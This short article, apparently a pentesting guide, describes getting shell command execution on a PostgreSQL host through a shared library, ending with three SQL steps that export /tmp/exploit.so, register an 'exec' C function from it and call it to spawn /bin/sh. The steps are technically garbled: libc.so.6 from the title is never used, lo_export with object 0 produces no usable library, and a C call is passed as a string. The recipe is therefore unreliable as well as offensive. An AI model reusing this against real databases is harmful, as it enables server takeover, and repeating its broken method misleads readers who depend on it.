# Using libc.so.6

## Context

This article focuses on exploiting command execution in PostgreSQL using the shared library `libc.so.6` for advanced post-exploitation. The reader is expected to have knowledge of dynamic linking, shared libraries, the Linux system call interface, and PostgreSQL command execution techniques.

## Theory

### Dynamic Linking in Linux

Dynamic linking is a mechanism that allows programs to use functions from shared libraries at runtime, rather than statically linking these functions at compile-time. Shared libraries like `libc.so.6` contain frequently used functions that can be utilized by multiple programs, reducing redundancy and memory usage.

### Exploiting Shared Libraries

The exploitation of shared libraries involves manipulating the way a program interacts with these libraries to achieve unintended behavior, such as arbitrary code execution. This typically involves injecting SQL payloads that exploit PostgreSQL's ability to call external C functions through shared libraries like `libc.so.6`.

### System Call Interface

System calls serve as the interface between user applications and the operating system kernel, providing necessary services such as file operations, process control, networking, and more. The `libc.so.6` library provides C standard library functions that act as convenient wrappers for these syscalls, enabling user applications to perform complex operations with simple function calls.

## Practice

### Exploiting PostgreSQL with libc.so.6

This section describes the steps needed to exploit PostgreSQL using the `libc.so.6` library to achieve command execution on the host system.

- **Exporting the Shared Object:**
  Use the following SQL command to export a shared object to the filesystem. This command will create a file on the server that can be used for executing arbitrary commands.

    ```bash
    SELECT lo_export(0, '/tmp/exploit.so');
    ```

- **Creating a Custom Function:**
  Create a PostgreSQL function using the exported shared object to execute arbitrary commands. This function will allow you to interact with the system's command line.

    ```bash
    CREATE OR REPLACE FUNCTION exec(text) RETURNS int AS '/tmp/exploit.so', 'exec' LANGUAGE C STRICT;
    ```

- **Executing a Shell Command:**
  Finally, invoke the custom function to execute a shell command. In this example, the command opens a shell:

    ```bash
    SELECT exec('system("/bin/sh")');
    ```

By following these steps, you achieve command execution on the PostgreSQL host by leveraging the functionality provided by `libc.so.6`.
